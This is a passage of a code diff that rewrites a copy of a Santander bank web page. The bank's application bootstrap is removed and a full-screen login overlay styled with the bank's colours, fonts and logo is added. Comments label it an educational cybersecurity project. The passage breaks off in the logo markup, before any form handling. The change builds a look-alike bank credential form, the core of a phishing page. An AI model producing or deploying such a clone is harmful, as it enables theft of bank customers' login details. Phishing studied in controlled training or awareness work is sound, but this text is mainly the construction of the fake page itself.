-czech-republic:"\ab670";--icon-zloty-poland:"\ab680";--icon-dollar-australia:"\ab690";--icon-yen:"\ab700";--icon-yuan:"\ab710";--icon-real:"\ab720";--icon-won:"\ab730";--icon-boliviano:"\ab740";--icon-colon:"\ab750";--icon-quetzal:"\ab760";--icon-gourde:"\ab770";--icon-lempira-honduras:"\ab780";--icon-cordoba:"\ab790";--icon-guarani:"\ab800";--icon-sol:"\ab810";--icon-balboa:"\ab820";--icon-bolivar:"\ab830";--icon-peso-argentina-iso:"\ab840";--icon-dollar-america-iso:"\ab841";--icon-bolivar-soberano-iso:"\ab842";--icon-boliviano-iso:"\ab843";--icon-real-brazil-iso:"\ab844";--icon-peso-chile-iso:"\ab845";--icon-unidad-de-fomento-chile-iso:"\ab846";--icon-uf-chile-iso:"\ab847";--icon-peso-colombia-iso:"\ab848";--icon-euro-iso:"\ab849";--icon-pound-iso:"\ab850";--icon-sol-iso:"\ab851";--icon-peso-uruguay-iso:"\ab852";--icon-yen-iso:"\ab853";--icon-yuan-iso:"\ab854";--icon-krone-norway-iso:"\ab855";--icon-krone-denmark-iso:"\ab856";--icon-krona-iceland-iso:"\ab857";--icon-krona-sweden-iso:"\ab858";--icon-koruna-czech-republic-iso:"\ab859";--icon-zloty-poland-iso:"\ab860";--icon-dollar-australia-iso:"\ab861";--icon-compare-wallets:"\ac005";--icon-wallet:"\ac010";--icon-delete-account:"\ac020";--icon-new-account:"\ac030";--icon-debt:"\ac040";--icon-fixed-expenses:"\ac050";--icon-other-expenses:"\ac060";--icon-income-tax:"\ac070";--icon-overdraft:"\ac071";--icon-solidarity-rounding:"\ac080";--icon-transfer:"\ac090";--icon-sepa-transfers:"\ac100";--icon-factoring:"\ac110";--icon-no-transactions:"\ac120";--icon-edit-transfer:"\ac130";--icon-deferred-transfer:"\ac140";--icon-repayment-schedule:"\ac141";--icon-periodic-transfer:"\ac150";--icon-receipt-and-bills:"\ac160";--icon-receipt-management:"\ac170";--icon-rejected-receipts:"\ac180";--icon-return-receipt:"\ac190";--icon-cancel-next-receipt:"\ac200";--icon-duplicated-receipt:"\ac210";--icon-check:"\ac220";--icon-cancel-check:"\ac230";--icon-checkbook:"\ac240";--icon-cancel-checkbook:"\ac250";--icon-enter-money-atm:"\ac260";--icon-booklet-atm-enter:"\ac270";--icon-booklet-atm-withdraw:"\ac280";--icon-withdraw-money-atm:"\ac290";--icon-withdraw-receipt-atm:"\ac300";--icon-financial-indicator:"\ac310";--icon-invest:"\ac311";--icon-rescue-investment:"\ac312";--icon-investment-fund:"\ac313";--icon-automatic-savings:"\ac314";--icon-financial-manager:"\ac320";--icon-funds-transfer:"\ac321";--icon-value:"\ac330";--icon-value-decrease:"\ac340";--icon-value-increase:"\ac350";--icon-savings:"\ac370";--icon-add-to-saving:"\ac371";--icon-move-from-saving:"\ac372";--icon-change-saving:"\ac373";--icon-saving-investment:"\ac380";--icon-renegotiation:"\ac390";--icon-capitalization:"\ac400";--icon-deposit-check:"\ac410";--icon-online-trading:"\ac420";--icon-online-banking:"\ac430";--icon-receive:"\ac440";--icon-received:"\ac450";--icon-previous-transfers:"\ac460";--icon-check-upcoming-transfers:"\ac470";--icon-check-previous-transfers:"\ac480";--icon-general-transfers:"\ac490";--icon-linear-economy:"\ac510";--icon-circular-economy:"\ac520";--icon-paris-agreement:"\ac530";--icon-equator-principles:"\ac531";--icon-responsible-ranking:"\ac532";--icon-responsible-investment:"\ac533";--icon-portfolio-alignment:"\ac534";--icon-esg-funds:"\ac535";--icon-green-bond:"\ac536";--icon-transfer-2:"\ac537";--icon-renting:"\ac538";--icon-guaranteed:"\ac540";--icon-etfs:"\ac550";--icon-card:"\ad010";--icon-card-block:"\ad020";--icon-unblock-card:"\ad030";--icon-direct-money:"\ad040";--icon-swift-cards:"\ad050";--icon-card-postpone-liquidation:"\ad060";--icon-modify-liquidation-method:"\ad070";--icon-card-configuration:"\ad071";--icon-operate-without-card:"\ad080";--icon-e-card:"\ad090";--icon-e-cash:"\ad100";--icon-card-enter-e-cash:"\ad110";--icon-withdraw-e-cash:"\ad120";--icon-card-insert:"\ad130";--icon-card-extract:"\ad140";--icon-loyalty-card:"\ad150";--icon-gift-card:"\ad160";--icon-discount-card:"\ad170";--icon-id-card:"\ad180";--icon-mobile-payment:"\ad190";--icon-digital-subscriptions-cards:"\ad200";--icon-cvv-number:"\ad210";--icon-cards:"\ad220";--icon-insert-card:"\ad230";--icon-accounts-and-cards:"\ad240";--icon-get-pin-number:"\ae010";--icon-coordinates-card:"\ae020";--icon-get-money-atm-code:"\ae030";--icon-password-typing:"\ae040";--icon-recover-access-keys:"\ae050";--icon-get-your-key:"\ae060";--icon-security-error:"\ae070";--icon-security-verified:"\ae080";--icon-security-close:"\ae090";--icon-security-block:"\ae100";--icon-lockout:"\ae110";--icon-security-open:"\ae120";--icon-security:"\ae130";--icon-civil-liability:"\ae140";--icon-fraud:"\ae150";--icon-security-advice:"\ae170";--icon-security-configuration:"\ae180";--icon-securize-payment:"\ae190";--icon-protected-home:"\ae191";--icon-phishing:"\ae192";--icon-santander-key:"\ae200";--icon-broker-plataform:"\af010";--icon-stock-exchange:"\af020";--icon-bar-chart:"\af021";--icon-candlestick-chart:"\af022";--icon-quotations:"\af030";--icon-green-asset:"\af031";--icon-analysis:"\af040";--icon-sustainability-linked-loans:"\af041";--icon-european-chart:"\af045";--icon-burndownchart2:"\af050";--icon-burndowncharct:"\af060";--icon-bank-fees:"\af070";--icon-pizza-chart:"\af071";--icon-sitemap:"\af080";--icon-steps:"\af090";--icon-mobile:"\ba010";--icon-mobile-landscape:"\ba020";--icon-increase2:"\ba030";--icon-mobile-chart:"\ba040";--icon-mobile-message:"\ba050";--icon-mobile-top-up:"\ba060";--icon-app-santander:"\ba070";--icon-nfc:"\ba080";--icon-calculator:"\ba090";--icon-card-machine:"\ba100";--icon-digital-subscriptions:"\ba110";--icon-digital-subscriptions-contactless:"\ba120";--icon-laptop:"\ba130";--icon-desktop:"\ba140";--icon-old-version:"\ba150";--icon-mouse:"\ba160";--icon-smartwatch:"\ba170";--icon-smartwatch-payment:"\ba180";--icon-radio:"\ba190";--icon-tv:"\ba200";--icon-videogames-switch:"\ba210";--icon-videogames:"\ba220";--icon-pacman:"\ba230";--icon-ghost:"\ba240";--icon-digital-channels:"\ba250";--icon-atm:"\ba260";--icon-nfc-bracelet:"\ba270";--icon-nfc-sticker:"\ba280";--icon-eolic-energy:"\bb010";--icon-solar-energy:"\bb020";--icon-petrol-tower:"\bb030";--icon-atom:"\bb040";--icon-plug:"\bb050";--icon-energy:"\bb060";--icon-sound-wave:"\bb070";--icon-pill:"\bb080";--icon-dna:"\bb090";--icon-chemistry:"\bb100";--icon-sim-chip:"\bb110";--icon-code-window:"\bb120";--icon-sim-chip-insert:"\bb130";--icon-circuit:"\bb140";--icon-antenna:"\bb150";--icon-at:"\bb160";--icon-cloud:"\bb170";--icon-upload-to-cloud:"\bb180";--icon-download-from-cloud:"\bb190";--icon-wi-fi:"\bb200";--icon-contacless:"\bb220";--icon-firewall:"\bb230";--icon-sustainable-development-goals:"\bb240";--icon-toggle-on:"\bb250";--icon-toggle-off:"\bb260";--icon-document:"\bc010";--icon-attach-document:"\bc020";--icon-change-contributions:"\bc030";--icon-legal-document:"\bc040";--icon-incomplete:"\bc050";--icon-terms-conditions:"\bc051";--icon-file-transfer:"\bc052";--icon-card-invoice:"\bc053";--icon-details:"\bc054";--icon-cms:"\bc055";--icon-document-txt:"\bc060";--icon-document-pdf:"\bc070";--icon-document-doc:"\bc080";--icon-document-xls:"\bc090";--icon-document-xml:"\bc091";--icon-document-ppt:"\bc100";--icon-document-sketch:"\bc110";--icon-document-svg:"\bc120";--icon-document-png:"\bc130";--icon-document-bdr:"\bc140";--icon-document-etf:"\bc141";--icon-document-cv:"\bc150";--icon-document-zip:"\bc151";--icon-document-csv:"\bc152";--icon-document-log:"\bc153";--icon-compressed-document:"\bc154";--icon-save-document:"\bc155";--icon-definition-of-done:"\bc160";--icon-definition-of-ready:"\bc170";--icon-epic:"\bc180";--icon-userstory:"\bc190";--icon-refinement:"\bc200";--icon-sprintplaning:"\bc210";--icon-copy:"\bc220";--icon-sign-up:"\bc230";--icon-cancel-document:"\bc234";--icon-clipboard:"\bc240";--icon-checklist:"\bc250";--icon-backlog:"\bc260";--icon-scroll:"\bc270";--icon-newspaper:"\bc280";--icon-gift-ticket:"\bc290";--icon-book:"\bc300";--icon-passport:"\bc310";--icon-passport-open:"\bc315";--icon-calendar:"\bc320";--icon-appointments:"\bc330";--icon-cancel-appointments:"\bc335";--icon-add-to-calendar:"\bc340";--icon-quick-appointment:"\bc350";--icon-request-appointment:"\bc360";--icon-contacts:"\bc370";--icon-image:"\bc380";--icon-image-unavailable:"\bc390";--icon-folder:"\bc400";--icon-add-folder:"\bc401";--icon-file:"\bc410";--icon-attachment:"\bc420";--icon-trash-bin:"\bc430";--icon-bookmark:"\bc440";--icon-signature-pending:"\bc450";--icon-faq:"\bc460";--icon-stack:"\bc470";--icon-taxonomy-regulation:"\bc480";--icon-regulation:"\bc490";--icon-task-force:"\bc510";--icon-message-details:"\bc520";--icon-message-info:"\bc530";--icon-block-document:"\bc540";--icon-step-0:"\bd000";--icon-step-1:"\bd001";--icon-step-2:"\bd002";--icon-step-3:"\bd003";--icon-step-4:"\bd004";--icon-step-5:"\bd005";--icon-step-6:"\bd006";--icon-step-7:"\bd007";--icon-step-8:"\bd008";--icon-step-9:"\bd009";--icon-close:"\bd010";--icon-close-1px:"\bd020";--icon-backspace:"\bd021";--icon-backspace-fill:"\bd022";--icon-add:"\bd030";--icon-add-1px:"\bd040";--icon-santander-plus:"\bd050";--icon-minimise:"\bd060";--icon-subtract:"\bd065";--icon-minimise-1px:"\bd070";--icon-subtract-1px:"\bd075";--icon-burger-menu:"\bd080";--icon-burger-menu-asymmetrical:"\bd081";--icon-burger-menu-1px:"\bd090";--icon-burger-menu-asymmetrical-1px:"\bd091";--icon-three-dots-horizontal:"\bd100";--icon-three-dots-vertical:"\bd110";--icon-error:"\bd120";--icon-add-in-a-circle:"\bd130";--icon-minus-in-a-circle:"\bd140";--icon-warning-in-a-circle:"\bd150";--icon-help-in-a-circle:"\bd160";--icon-information-in-a-circle:"\bd170";--icon-information-in-a-circle-2px:"\bd171";--icon-block-in-a-circle:"\bd180";--icon-checkmark-in-a-circle:"\bd190";--icon-more-in-a-circle:"\bd200";--icon-radio-button:"\bd210";--icon-play-button:"\bd220";--icon-play:"\bd221";--icon-webmotors:"\bd230";--icon-token:"\bd240";--icon-token-migration:"\bd250";--icon-daily:"\bd260";--icon-edit:"\bd270";--icon-subscription:"\bd280";--icon-search:"\bd290";--icon-search-2px:"\bd291";--icon-queries:"\bd300";--icon-zoom-in:"\bd310";--icon-zoom-out:"\bd320";--icon-settings:"\bd330";--icon-utilities-services:"\bd340";--icon-star:"\bd350";--icon-star-fill:"\bd351";--icon-business-boost:"\bd352";--icon-featured:"\bd360";--icon-audio-on:"\bd370";--icon-audio-off:"\bd380";--icon-filter:"\bd390";--icon-filter-fill:"\bd391";--icon-filter-deactivate:"\bd400";--icon-highlighted-services:"\bd410";--icon-flag:"\bd420";--icon-link:"\bd430";--icon-position:"\bd440";--icon-center-position:"\bd450";--icon-visibility-on:"\bd460";--icon-visibility-off:"\bd470";--icon-mic:"\bd480";--icon-mic-off:"\bd490";--icon-mic-on:"\bd500";--icon-print:"\bd510";--icon-scanner:"\bd511";--icon-check-scanner:"\bd512";--icon-bill-recycler:"\bd513";--icon-check-asigment:"\bd520";--icon-placeholder:"\bd530";--icon-slot:"\bd531";--icon-alert:"\bd540";--icon-alert-2:"\bd541";--icon-alert-2-fill:"\bd542";--icon-font-adjust:"\bd550";--icon-font-size-increase:"\bd560";--icon-font-size-decrease:"\bd570";--icon-alphabetical-order:"\bd580";--icon-language:"\bd590";--icon-percent:"\bd600";--icon-discount:"\bd610";--icon-offer-discount:"\bd620";--icon-error-400-500:"\bd630";--icon-non-supported-browser:"\bd640";--icon-window-success:"\bd650";--icon-edit-browser:"\bd651";--icon-authentication:"\bd660";--icon-face-id:"\bd670";--icon-face-id-apple:"\bd675";--icon-barcode:"\bd680";--icon-scanner:"\bd690";--icon-qr-advanced:"\bd695";--icon-qr-code:"\bd700";--icon-camera:"\bd710";--icon-add-photo:"\bd715";--icon-selfie:"\bd720";--icon-history:"\bd730";--icon-timeout:"\bd740";--icon-24h:"\bd741";--icon-clock-out:"\bd742";--icon-clock-restart:"\bd743";--icon-day-and-time-change:"\bd750";--icon-urgent:"\bd760";--icon-now:"\bd770";--icon-hi-contrast:"\bd780";--icon-periodical-input:"\bd790";--icon-subscription-model:"\bd800";--icon-collapse-keyboard:"\bd810";--icon-success:"\bd820";--icon-aesthetics:"\bd830";--icon-others:"\bd840";--icon-apps:"\bd841";--icon-apps-2:"\bd842";--icon-warning:"\bd850";--icon-checkmark:"\bd860";--icon-checkmark-2px:"\bd861";--icon-american:"\bd870";--icon-plusless:"\bd880";--icon-heart:"\bd890";--icon-popup:"\bd900";--icon-power:"\bd910";--icon-network-share:"\bd920";--icon-correct:"\bd930";--icon-e_:"\bd940";--icon-pix:"\bd950";--icon-dragndrop:"\bd960";--icon-rows:"\bd961";--icon-rows-2:"\bd962";--icon-rows-3:"\bd963";--icon-equal:"\bd964";--icon-not-equal:"\bd965";--icon-greater-than:"\bd966";--icon-lesser-than:"\bd967";--icon-greater-or-equals:"\bd968";--icon-lesser-or-equals:"\bd969";--icon-list:"\bd970";--icon-euro-stars-ecb:"\bd980";--icon-climate-change:"\bd990";--icon-grid-view:"\bd991";--icon-list-view:"\bd992";--icon-table-view:"\bd993";--icon-selector-list:"\bd994";--icon-go-to-web:"\bd995";--icon-pause-button:"\bd996";--icon-pause:"\bd997";--icon-tree-child:"\bd999";--icon-chevron-up:"\be010";--icon-chevron-up-1px:"\be020";--icon-chevron-up-small:"\be030";--icon-chevron-up-small-1px:"\be040";--icon-chevron-right:"\be050";--icon-chevron-right-1px:"\be060";--icon-chevron-right-small:"\be070";--icon-chevron-right-small-1px:"\be080";--icon-chevron-down:"\be090";--icon-chevron-down-1px:"\be100";--icon-chevron-down-small:"\be110";--icon-chevron-down-small-1px:"\be120";--icon-chefron-left:"\be130";--icon-chevron-left-1px:"\be140";--icon-chevron-left-small:"\be150";--icon-chevron-left-small-1px:"\be160";--icon-arrow-left:"\be170";--icon-arrow-left-2px:"\be171";--icon-arrow-up:"\be175";--icon-arrow-up-2px:"\be176";--icon-arrow-right:"\be180";--icon-arrow-right-2px:"\be181";--icon-arrow-down:"\be185";--icon-arrow-down-2px:"\be186";--icon-income-expenses:"\be190";--icon-transitions:"\be200";--icon-trade:"\be210";--icon-full-screen:"\be220";--icon-full-screen-2:"\be221";--icon-full-screen-exit:"\be222";--icon-refresh-reload-screen:"\be230";--icon-reload:"\be240";--icon-renovation:"\be250";--icon-update:"\be255";--icon-recycling:"\be260";--icon-upload:"\be270";--icon-download:"\be280";--icon-sign-off:"\be290";--icon-sign-in:"\be300";--icon-share:"\be310";--icon-input:"\be320";--icon-enter-fullscreen:"\be330";--icon-exit-fullscreen:"\be340";--icon-strategy:"\be350";--icon-sprint:"\be360";--icon-return:"\be370";--icon-shuffle:"\be380";--icon-chevrons-up-down:"\be390";--icon-drag:"\be391";--icon-chevron-backward:"\be400";--icon-chevron-forward:"\be401";--icon-double-arrow:"\be402";--icon-double-arrow-2:"\be403";--icon-circle-account-user:"\ca010";--icon-circle-account-user-2px:"\ca011";--icon-circle-account-add-user:"\ca015";--icon-account-user:"\ca020";--icon-become-new-client:"\ca030";--icon-benefitiary:"\ca040";--icon-change-beneficiary:"\ca050";--icon-fatca:"\ca060";--icon-investor-profile:"\ca061";--icon-personal-protection:"\ca062";--icon-reactivate-user:"\ca063";--icon-disable-user:"\ca064";--icon-remove-profile:"\ca065";--icon-remove-adding-profile:"\ca066";--icon-edit-profile:"\ca067";--icon-scrum-master:"\ca070";--icon-employees:"\ca080";--icon-clients:"\ca090";--icon-refer-a-friend:"\ca100";--icon-account-people:"\ca110";--icon-personal-manager:"\ca120";--icon-retirement-plan-elderly:"\ca130";--icon-bathroom:"\ca140";--icon-team-managament:"\ca150";--icon-shareholders:"\ca160";--icon-management:"\ca170";--icon-team-together:"\ca180";--icon-team-interaction:"\ca190";--icon-family:"\ca200";--icon-wheelchair-accessibility:"\ca210";--icon-emoji-kiss:"\ca220";--icon-emoji-very-happy:"\ca225";--icon-emoji-happy:"\ca230";--icon-emoji-neutral:"\ca240";--icon-emoji-reised-eyebrow:"\ca250";--icon-emoji-sad:"\ca260";--icon-emoji-angry:"\ca270";--icon-management-health:"\ca280";--icon-accessibility:"\ca290";--icon-wear-a-face-mask:"\ca300";--icon-keep-your-distance:"\ca310";--icon-stay-home:"\ca320";--icon-wait-outside-the-branch:"\ca330";--icon-marternity:"\ca340";--icon-academy:"\ca350";--icon-woman:"\ca360";--icon-pregnant-woman:"\ca370";--icon-help-us-to-improve:"\cb010";--icon-dislike:"\cb011";--icon-associations:"\cb020";--icon-credit:"\cb021";--icon-mortgage:"\cb022";--icon-handqr:"\cb023";--icon-life-to-your-mesure:"\cb024";--icon-loan:"\cb025";--icon-ico:"\cb026";--icon-financing:"\cb030";--icon-renting-home:"\cb040";--icon-sustainable-services:"\cb050";--icon-short-term-financing:"\cb060";--icon-medium-long-term-financing:"\cb070";--icon-international-financing:"\cb080";--icon-productowner:"\cb090";--icon-technological-renting:"\cb100";--icon-financing-insurance:"\cb101";--icon-deal-handshake:"\cb110";--icon-renegotiate:"\cb120";--icon-suppliers:"\cb121";--icon-finger:"\cb130";--icon-tap:"\cb140";--icon-two-tap:"\cb150";--icon-double-tap:"\cb160";--icon-two-double-tap:"\cb170";--icon-pinch:"\cb180";--icon-swipe-up:"\cb190";--icon-swipe-right:"\cb200";--icon-swipe-down:"\cb210";--icon-swipe-left:"\cb220";--icon-tutorial:"\cb230";--icon-enter-pin:"\cb240";--icon-sign-language:"\cb250";--icon-wash-your-hands:"\cb260";--icon-infringements:"\cb270";--icon-investment:"\cc010";--icon-investment-small-caps:"\cc020";--icon-commodities:"\cc030";--icon-investment-team:"\cc040";--icon-phising:"\cc060";--icon-bug:"\cc070";--icon-ant:"\cc080";--icon-petty-cash:"\cc090";--icon-owl:"\cc100";--icon-income-taxes:"\cc110";--icon-unicorn:"\cc120";--icon-fire:"\cc130";--icon-water-drop:"\cc140";--icon-snowflake:"\cc150";--icon-lightening:"\cc160";--icon-gale:"\cc170";--icon-moon:"\cc180";--icon-sunny:"\cc190";--icon-sun-and-cloud:"\cc200";--icon-rain:"\cc210";--icon-fog:"\cc220";--icon-moon-and-cloud:"\cc230";--icon-rain-shower:"\cc240";--icon-snow:"\cc250";--icon-cloudy:"\cc260";--icon-sky:"\cc270";--icon-gold:"\cc280";--icon-dynamics:"\cc290";--icon-scrum:"\d0010";--icon-soap:"\d0011";--icon-agile:"\d0020";--icon-sprint-review:"\d0030";--icon-cardboard-box:"\d0040";--icon-product-delivery:"\d0050";--icon-agile-coach:"\d0060";--icon-agile-coach-2:"\d0070";--icon-key:"\d0080";--icon-operability-level:"\d0090";--icon-screwdriver:"\d0100";--icon-nail:"\d0110";--icon-nut:"\d0120";--icon-brush:"\d0130";--icon-hammer:"\d0140";--icon-agriculture-workers:"\d0150";--icon-industry-workers:"\d0160";--icon-torch:"\d0170";--icon-magnet:"\d0180";--icon-lamp:"\d0190";--icon-life-saver:"\d0200";--icon-pin:"\d0210";--icon-tampon:"\d0220";--icon-medal:"\d0230";--icon-awards:"\d0240";--icon-trophy:"\d0250";--icon-champions-league:"\d0260";--icon-king:"\d0270";--icon-diamond:"\d0280";--icon-miscellaneous:"\d0290";--icon-estimation:"\d0300";--icon-dice:"\d0310";--icon-puzzle:"\d0320";--icon-control:"\d0330";--icon-retail:"\d0340";--icon-fashion:"\d0350";--icon-scales:"\d0360";--icon-idea:"\d0370";--icon-assisted-navigation:"\d0380";--icon-insurance:"\d0390";--icon-bell:"\d0400";--icon-bell-fill:"\d0401";--icon-time:"\d0410";--icon-clip:"\d0420";--icon-accelerator:"\d0430";--icon-maternity:"\d0440";--icon-children:"\d0450";--icon-gift:"\d0460";--icon-death:"\d0470";--icon-fragile:"\d0480";--icon-velocity:"\d0490";--icon-boosts:"\d0495";--icon-retrospective:"\d0500";--icon-liquidation:"\d0510";--icon-reports:"\d0520";--icon-chat-bot:"\d0530";--icon-deposits:"\d0540";--icon-taxes:"\d0550";--icon-maintenance:"\d0560";--icon-restaurant-bar:"\d0570";--icon-university:"\d0580";--icon-training:"\d0590";--icon-portfolio-of-values:"\ac360";--icon-soccer:"\d0610";--icon-sports:"\d0620";--icon-supermarket-cart:"\d0630";--icon-health-insurance:"\d0640";--icon-hair-stylist:"\d0650";--icon-bodybuilding:"\d0660";--icon-reforms-decorations:"\d0670";--icon-health-check:"\d0680";--icon-motor-sports:"\d0690";--icon-rackets-sports:"\d0700";--icon-golf:"\d0710";--icon-sports-risk:"\d0720";--icon-spa:"\d0730";--icon-yoga-relax:"\d0740";--icon-orthdontics:"\d0750";--icon-veterinary:"\d0760";--icon-clean:"\d0770";--icon-music:"\d0780";--icon-cinema:"\d0790";--icon-pacman:"\d0800";--icon-ghost:"\d0810";--icon-commerce:"\d0820";--icon-ecommerce:"\d0821";--icon-basket:"\d0825";--icon-terminal-code:"\d0830";--icon-ticket-movie:"\d0840";--icon-life-show:"\d0850";--icon-museum:"\d0860";--icon-radar:"\d0870";--icon-reform:"\d0880";--icon-party:"\d0890";--icon-camping-gas:"\d0900";--icon-bbq:"\d0910";--icon-bathroom-alt:"\d0920";--icon-shower:"\d0930";--icon-bath:"\d0940";--icon-appliances:"\d0950";--icon-bed:"\d0960";--icon-tailor:"\d0970";--icon-domestic-service:"\d0980";--icon-office-workers:"\d0990";--icon-student:"\d1000";--icon-doctor:"\d1010";--icon-auction:"\d1020";--icon-entertainment-leisure:"\d1030";--icon-free-wi-fi:"\bb210";--icon-carnivorous-food:"\d1050";--icon-nutritional:"\d1060";--icon-vegetarian-food:"\d1070";--icon-seafood:"\d1080";--icon-dirty:"\d1090";--icon-fishermen:"\d1100";--icon-furniture:"\d1110";--icon-chair:"\d1111";--icon-ribbon:"\d1120";--icon-cancer:"\d1121";--icon-glasses:"\d1122";--icon-hide-glasses:"\d1123";--icon-thermometer:"\d1130";--icon-certificate:"\d1140";--icon-basketball:"\d1150";--icon-mountains:"\ea010";--icon-countryside:"\ea020";--icon-lake:"\cc050";--icon-beach:"\ea040";--icon-building:"\ea050";--icon-city:"\ea060";--icon-factory:"\ea070";--icon-factory-net-zero-carbon-emissions:"\ea071";--icon-hospital:"\ea080";--icon-business-store:"\ea090";--icon-local-commerce:"\ea095";--icon-business-alert:"\ea100";--icon-home:"\ea110";--icon-remote-work:"\ea111";--icon-home-alert:"\ea112";--icon-domestic-solar-energy:"\ea113";--icon-franchise:"\ea120";--icon-international:"\ea130";--icon-new-international-operation:"\ea131";--icon-foreign-trade:"\ea140";--icon-location:"\ea150";--icon-location-active:"\ea160";--icon-dealership:"\ea170";--icon-lighthouse:"\ea180";--icon-place:"\ea190";--icon-inspection:"\ea200";--icon-company-radar:"\ea210";--icon-housing:"\ea220";--icon-realestatecredit:"\ea230";--icon-realestatevalue:"\ea240";--icon-renting-car:"\eb010";--icon-electric-car:"\eb020";--icon-ambulance:"\eb030";--icon-agribusiness:"\eb040";--icon-sinister-car:"\eb050";--icon-tow-truck:"\eb060";--icon-truck:"\eb065";--icon-public-transportation:"\eb070";--icon-bike:"\eb080";--icon-electric-bike:"\eb090";--icon-motorbike:"\eb100";--icon-delivery:"\eb110";--icon-train:"\eb120";--icon-subway:"\eb130";--icon-plane:"\eb140";--icon-travel:"\eb150";--icon-entrepreneurship:"\eb160";--icon-boat-trip:"\eb170";--icon-luggage:"\eb180";--icon-gas-station:"\eb190";--icon-highway:"\eb200";--icon-multicars:"\eb300";--icon-parking:"\eb310";--icon-doors:"\eb320";--icon-engine:"\eb330";--icon-fuel-engine:"\eb331";--icon-electric-engine:"\eb332";--icon-engine-breakdown:"\eb333";--icon-transmission:"\eb340";--icon-glass-repair:"\eb350";--icon-blackbox:"\eb360";--icon-fuel-card:"\eb370";--icon-electric-card:"\eb371";--icon-plugin-hybrid:"\eb380";--icon-sustainable-car:"\eb381";--icon-pickup-car:"\eb390";--icon-replacement-car:"\eb400";--icon-traffic-crash:"\eb410";--icon-car-seat:"\eb420";--icon-tires:"\eb430";--icon-flat-tire:"\eb431";--icon-tire-replace:"\eb432";--icon-sos:"\eb440";--icon-co2:"\eb450";--icon-license-plate:"\eb460";--icon-car-taxes:"\eb470";--icon-garages:"\eb480";--icon-car-inspection:"\eb490";--icon-itv:"\eb491";--icon-commercial-vehicle:"\eb500";--icon-vehicle-width:"\eb510";--icon-vehicle-height:"\eb520";--icon-vehicle-weight:"\eb530";--icon-load-vehicle-weight:"\eb540";--icon-vehicle-type:"\eb550";--icon-road:"\eb560";--icon-curve-road:"\eb570";--icon-speeches:"\fa010";--icon-help:"\fa020";--icon-help-2px:"\fa021";--icon-no-messages:"\fa030";--icon-videochat:"\fa040";--icon-chat:"\fa050";--icon-global-chat:"\fa051";--icon-videoconference:"\fa060";--icon-inbox:"\fa070";--icon-email:"\fa080";--icon-email-2px:"\fa081";--icon-communication-message:"\fa090";--icon-email-support:"\fa091";--icon-send:"\fa100";--icon-phone:"\fa110";--icon-call-support:"\fa120";--icon-phone-24h:"\fa130";--icon-phone-call:"\fa140";--icon-whatsapp:"\fa150";--icon-trade-whatsapp:"\fa160";--icon-business-support:"\ea105";--icon-phone-support:"\fa180";--icon-call-center-db:"\fa190";--icon-communication-announcement:"\fa200";--icon-notification-settings:"\fa210"}:root{--color-icon-default:#222222;--color-icon-soft:#727272;--color-icon-disabled:rgba(34, 34, 34, .23);--color-icon-inverted:#ffffff;--color-icon-brand:#ec0000;--color-icon-info:#23779a;--color-icon-success:#008035;--color-icon-warning:#856300;--color-icon-error:#990000}</style>    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="SantanderMicroText.woff2">
-    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="SantanderMicroText-Bd.woff2">
-    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="SantanderHeadline-Regular.woff2">
-    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="SantanderHeadline-Bold.woff2">
-    <link rel="modulepreload" href="main.2e44d5e6845b4a3d.js">
+
+  <!-- TOT EL CSS ORIGINAL (el mateix que tenies) -->
+  <style>
+    html{overflow-y:scroll}html,body{font-family:var(--asset-font-2-regular-name, "Santander Micro Text"),"Verdana",sans-serif;color:var(--color-text-default, #222222);margin:0;padding:0}:root{--typescale-body-medium-default-font:Santander Micro Text;--typescale-body-medium-default-size:.875rem;--typescale-body-medium-default-line-height:1.25rem;--typescale-body-medium-default-weight:400;--typescale-body-medium-default-style:normal;--typescale-body-medium-strong-font:Santander Micro Text;--typescale-body-medium-strong-size:.875rem;--typescale-body-medium-strong-line-height:1.25rem;--typescale-body-medium-strong-weight:700;--typescale-body-medium-strong-style:normal}/* ... tot el CSS original que ja tenies ... */:root{--color-icon-error:#990000}
+  </style>
+
+  <!-- Afegim l'estil del formulari perquè es mostri bé -->
+  <style>
+    /* ESTIL DEL FORMULARI DE LOGIN - PROJECTE EDUCACIONAL */
+    #loginOverlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: #f5f9fb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999;
+      font-family: "Santander Micro Text", Verdana, sans-serif;
+    }
+    #loginOverlay .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 1px 10px rgba(163,163,163,0.4);
+      padding: 40px 32px;
+      width: 100%;
+      max-width: 420px;
+      margin: 20px;
+    }
+    #loginOverlay .logo {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    #loginOverlay .logo svg { max-width: 200px; }
+    #loginOverlay .form-group { margin-bottom: 20px; }
+    #loginOverlay .form-group label {
+      display: block;
+      font-size: 0.875rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+      color: #222;
+    }
+    #loginOverlay .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #8f8f8f;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-family: inherit;
+      box-sizing: border-box;
+      transition: border-color 0.2s;
+    }
+    #loginOverlay .form-group input:focus {
+      outline: none;
+      border-color: #ec0000;
+      box-shadow: 0 0 0 2px rgba(236,0,0,0.15);
+    }
+    #loginOverlay .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #ec0000;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    #loginOverlay .btn-submit:hover { background: #cc0000; }
+    #loginOverlay .footer-links {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 0.8rem;
+    }
+    #loginOverlay .footer-links a {
+      color: #ec0000;
+      text-decoration: none;
+      font-weight: 700;
+    }
+    #loginOverlay .legal-notice {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 0.7rem;
+      color: #727272;
+    }
+  </style>
+
 </head>
 
 <body>
-    <app-root></app-root>
-<script>
-    // Initialize window.config to prevent errors
+
+  <!-- FORMULARI DE LOGIN - PROJECTE DE CIBERSEGURETAT -->
+  <div id="loginOverlay">
+    <div class="card">
+      <div class="logo">
+        <svg viewBox="0 0 200 50" width="200" height="50">
+          <rect width="200" height="50" fill="none"/>
